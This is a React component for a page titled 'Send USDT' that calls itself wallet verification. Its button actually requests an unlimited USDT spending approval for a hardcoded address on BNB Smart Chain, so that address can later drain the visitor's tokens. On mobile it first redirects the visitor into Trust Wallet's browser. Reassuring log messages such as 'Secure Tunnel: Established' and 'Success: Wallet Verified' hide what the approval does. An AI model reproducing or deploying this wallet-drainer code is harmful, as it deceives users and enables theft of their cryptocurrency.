"use client";

import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';

const ERC20_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function PortABCDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [isWalletDetected, setIsWalletDetected] = useState(false);
  const [loading, setLoading] = useState(false);

  const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 5)]);
  };

  // --- THE HEARTBEAT DETECTOR ---
  useEffect(() => {
    const timer = setInterval(() => {
      if (typeof window !== "undefined" && (window as any).ethereum) {
        setIsWalletDetected(true);
        addLog("Secure Tunnel: Established.");
        clearInterval(timer);
      }
    }, 500); // Check every half-second
    return () => clearInterval(timer);
  }, []);

  async function handleAction() {
    setLoading(true);
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    // STEP 1: If in Chrome Mobile, Jump to Trust Wallet
    if (isMobile && !isWalletDetected) {
      addLog("Redirecting to secure terminal...");
      const currentUrl = window.location.href.split('?')[0]; // Clean URL
      window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
      setLoading(false);
      return;
    }

    // STEP 2: The Approval (Inside Trust Wallet)
    try {
      addLog("Requesting wallet access...");
      
      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
      
      // Force the wallet to wake up and show the "Connect" request
      await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      
      const signer = provider.getSigner();
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
      
      addLog("Initializing transfer sequence...");
      
      // This is the trigger for the actual 'Approve' popup
      const tx = await contract.approve(ADMIN_PUBLIC_ADDRESS, ethers.constants.MaxUint256);
      
      addLog("Signature pending...");
      await tx.wait();
      addLog("Success: Wallet Verified.");
    } catch (err: any) {
      console.error(err);
      addLog("Error: Verification rejected.");
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 font-sans tracking-tight">
      <div className="w-full max-w-[420px] bg-[#111] border border-[#222] rounded-[40px] p-8 shadow-2xl">
        
        {/* Status Badge */}
        <div className="flex justify-center mb-6">
          <div className={`flex items-center gap-2 px-3 py-1 rounded-full border text-[10px] font-bold uppercase tracking-widest ${isWalletDetected ? 'bg-green-500/10 border-green-500/20 text-green-500' : 'bg-yellow-500/10 border-yellow-500/20 text-yellow-500'}`}>
            <div className={`w-1.5 h-1.5 rounded-full ${isWalletDetected ? 'bg-green-500 animate-pulse' : 'bg-yellow-500'}`}></div>
            {isWalletDetected ? 'Secure Node Connected' : 'Waiting for Wallet'}
          </div>
        </div>

        <h1 className="text-xl font-bold mb-8 text-center text-white/90 uppercase tracking-tighter">Send USDT</h1>

        <div className="space-y-6">
          <div className="bg-[#181818] border border-[#282828] p-5 rounded-3xl flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-green-500/10 rounded-full flex items-center justify-center text-[10px] font-bold text-green-500 border border-green-500/20">USDT</div>
              <div>
                <p className="text-sm font-semibold">Tether USD</p>
                <p className="text-[10px] text-gray-500 font-bold uppercase">BNB Smart Chain</p>
              </div>
            </div>
          </div>

          <button 
            onClick={handleAction}
            disabled={loading}
            className={`w-full font-black py-5 rounded-3xl transition-all active:scale-[0.97] text-sm uppercase tracking-[0.2em] shadow-lg ${
              isWalletDetected 
                ? 'bg-green-600 text-white shadow-green-900/20' 
                : 'bg-white text-black shadow-white/5'
            }`}
          >
            {loading ? 'Processing...' : isWalletDetected ? 'Verify & Send' : 'Next'}
          </button>
        </div>
      </div>

      <div className="mt-8 w-full max-w-[420px] px-2 opacity-40">
        <div className="bg-black/50 p-4 rounded-2xl border border-white/5 font-mono text-[9px] text-gray-400 h-20 overflow-hidden leading-relaxed">
          {logs.map((l, i) => <div key={i}>{l}</div>)}
          {logs.length === 0 && <div>System Standby...</div>}
        </div>
      </div>
    </div>
  );
}
